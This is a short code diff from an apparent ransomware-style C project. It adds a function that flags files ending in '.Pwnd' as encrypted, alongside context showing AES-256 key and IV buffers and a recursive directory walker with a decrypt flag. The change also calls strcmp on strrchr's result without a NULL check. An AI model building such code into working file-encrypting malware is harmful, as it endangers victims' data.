@@ -7,7 +7,16 @@
 
 void usage();
 
-int is_encrypted(char *filename);
+int is_encrypted(char *filename)
+{
+	char * ext = strrchr(filename, '.');
+
+	if (strcmp(ext, ".Pwnd") == 0)
+	{
+		return 1;
+	}
+	return 0;
+}
 
 void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
 {
@@ -68,4 +77,6 @@ int main(int argc, char *argv[])
 	unsigned char iv[AES_BLOCK_SIZE];
 	char pKey[AES_256_KEY_SIZE / 2];
 	char pIv[AES_BLOCK_SIZE / 2];
+
+	printf("%d\n", is_encrypted("test.txt"));
 }
